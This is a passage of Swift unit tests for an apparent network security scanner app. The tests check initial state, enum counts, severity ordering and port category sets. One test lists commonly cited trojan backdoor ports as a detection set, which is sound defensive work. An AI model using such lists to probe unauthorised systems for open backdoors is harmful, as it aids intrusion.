        XCTAssertGreaterThanOrEqual(extreme.overallRiskScore, 0,
            "Risk score must never be negative, even with extreme threat counts")
    }
}

// MARK: - Frame Tests

final class FrameTests: XCTestCase {

    // MARK: - App and Manager Initialization

    /// Verify AdvancedPortScanner shared instance initializes correctly
    @MainActor
    func testAdvancedPortScannerSharedInstanceExists() {
        let scanner = AdvancedPortScanner.shared
        XCTAssertNotNil(scanner)
        XCTAssertFalse(scanner.isScanning, "Scanner should not be scanning on init")
        XCTAssertEqual(scanner.progress, 0, "Scanner progress should be 0 on init")
    }

    /// Verify ThreatAnalyzer initializes with nil summary
    @MainActor
    func testThreatAnalyzerInitialState() {
        let analyzer = ThreatAnalyzer()
        XCTAssertNil(analyzer.networkSummary, "Should be nil before analysis")
        XCTAssertTrue(analyzer.deviceSummaries.isEmpty)
        XCTAssertTrue(analyzer.allThreats.isEmpty)
    }

    /// Verify ExportManager shared instance initializes correctly
    @MainActor
    func testExportManagerInitialState() {
        let manager = ExportManager.shared
        XCTAssertNotNil(manager)
        XCTAssertFalse(manager.isExporting)
        XCTAssertNil(manager.exportError)
    }

    /// Verify ScanPresetManager has all built-in presets loaded
    @MainActor
    func testScanPresetManagerHasBuiltInPresets() {
        let manager = ScanPresetManager.shared
        XCTAssertNotNil(manager)
        // Built-in presets are always available
        XCTAssertEqual(ScanPreset.builtInPresets.count, 10)
        XCTAssertTrue(manager.allPresets.count >= 10,
            "Manager should have at least 10 presets (built-in)")
    }

    /// Verify ScheduledScanManager is accessible
    @MainActor
    func testScheduledScanManagerExists() {
        let manager = ScheduledScanManager.shared
        XCTAssertNotNil(manager)
    }

    /// Verify AIBackendManager initializes with expected defaults
    @MainActor
    func testAIBackendManagerInitialState() {
        let manager = AIBackendManager.shared
        XCTAssertNotNil(manager)
        XCTAssertFalse(manager.isProcessing)
    }

    /// Verify NovaAPIServer has correct port
    @MainActor
    func testNovaAPIServerPort() {
        let server = NovaAPIServer.shared
        XCTAssertEqual(server.port, 37423, "Nova API server must listen on port 37423")
    }

    // MARK: - Export Formats

    /// Verify all export formats are registered
    @MainActor
    func testExportFormatsAvailable() {
        let formats = ExportManager.ExportFormat.allCases
        XCTAssertEqual(formats.count, 4)

        let extensions = formats.map { $0.fileExtension }
        XCTAssertTrue(extensions.contains("pdf"))
        XCTAssertTrue(extensions.contains("csv"))
        XCTAssertTrue(extensions.contains("json"))
        XCTAssertTrue(extensions.contains("html"))
    }

    // MARK: - AIBackend Enumeration

    /// Verify all AI backends are enumerated
    @MainActor
    func testAllAIBackendsExist() {
        XCTAssertEqual(AIBackend.allCases.count, 6)
        // Verify each has required properties
        for backend in AIBackend.allCases {
            XCTAssertFalse(backend.rawValue.isEmpty)
            XCTAssertFalse(backend.icon.isEmpty)
            XCTAssertFalse(backend.description.isEmpty)
        }
    }

    /// Verify AIBackendError has descriptions for all cases
    func testAIBackendErrorDescriptions() {
        let errors: [AIBackendError] = [
            .noBackendAvailable,
            .invalidConfiguration,
            .invalidState,
            .mlxScriptNotConfigured,
            .mlxExecutionFailed("test"),
            .embeddingsNotSupported
        ]
        for error in errors {
            XCTAssertNotNil(error.errorDescription,
                "AIBackendError must have a description")
            XCTAssertFalse(error.errorDescription!.isEmpty)
        }
    }

    /// Verify MLXError has descriptions for all cases
    func testMLXErrorDescriptions() {
        let errors: [MLXError] = [
            .notAvailable,
            .modelNotFound,
            .inferenceError("test"),
            .decodingError,
            .executionError("test")
        ]
        for error in errors {
            XCTAssertNotNil(error.errorDescription,
                "MLXError must have a description")
            XCTAssertFalse(error.errorDescription!.isEmpty)
        }
    }

    // MARK: - PortScanMode Enumeration

    /// Verify all port scan modes have descriptions and icons
    func testPortScanModeProperties() {
        for mode in PortScanMode.allCases {
            XCTAssertFalse(mode.description.isEmpty, "Mode \(mode.rawValue) must have description")
            XCTAssertFalse(mode.estimatedTimePerHost.isEmpty, "Mode \(mode.rawValue) must have time estimate")
            XCTAssertGreaterThan(mode.portCount, 0, "Mode \(mode.rawValue) must have positive port count")
        }
    }

    // MARK: - ThreatSeverity Ordering

    /// Verify threat severity comparison is consistent
    func testThreatSeverityOrderingConsistent() {
        XCTAssertTrue(ThreatSeverity.critical < ThreatSeverity.high)
        XCTAssertTrue(ThreatSeverity.high < ThreatSeverity.medium)
        XCTAssertTrue(ThreatSeverity.medium < ThreatSeverity.low)
        XCTAssertTrue(ThreatSeverity.low < ThreatSeverity.info)
        // Transitivity
        XCTAssertTrue(ThreatSeverity.critical < ThreatSeverity.info)
    }

    /// Verify all 5 severity levels exist
    func testThreatSeverityAllCases() {
        XCTAssertEqual(ThreatSeverity.allCases.count, 5)
    }

    // MARK: - ThreatCategory

    /// Verify all 8 threat categories exist
    func testThreatCategoryAllCases() {
        XCTAssertEqual(ThreatCategory.allCases.count, 8)
    }

    // MARK: - PortInfo Static Sets

    /// Verify backdoor port set contains all known trojan ports
    func testBackdoorPortSetCompleteness() {
        let expected = [31337, 12345, 12346, 1243, 6667, 6668, 6669, 27374, 2001, 1999, 30100, 30101, 30102, 5000, 5001, 5002]
        for port in expected {
            XCTAssertTrue(PortInfo.backdoorPorts.contains(port),
                "Backdoor set must contain port \(port)")
        }
    }

    /// Verify remote access port set contains SSH, Telnet, RDP, VNC
    func testRemoteAccessPortSetCompleteness() {
        let expected = [22, 23, 3389, 5900, 5901, 5902, 5800, 5801, 5802]
        for port in expected {
            XCTAssertTrue(PortInfo.remoteAccessPorts.contains(port),
                "Remote access set must contain port \(port)")
        }
    }

    /// Verify database port set contains all major database ports
    func testDatabasePortSetCompleteness() {
        let expected = [3306, 5432, 1433, 1434, 27017, 27018, 27019, 6379, 9042, 7000, 7001, 8086]
        for port in expected {
            XCTAssertTrue(PortInfo.databasePorts.contains(port),
                "Database set must contain port \(port)")
        }
    }
}
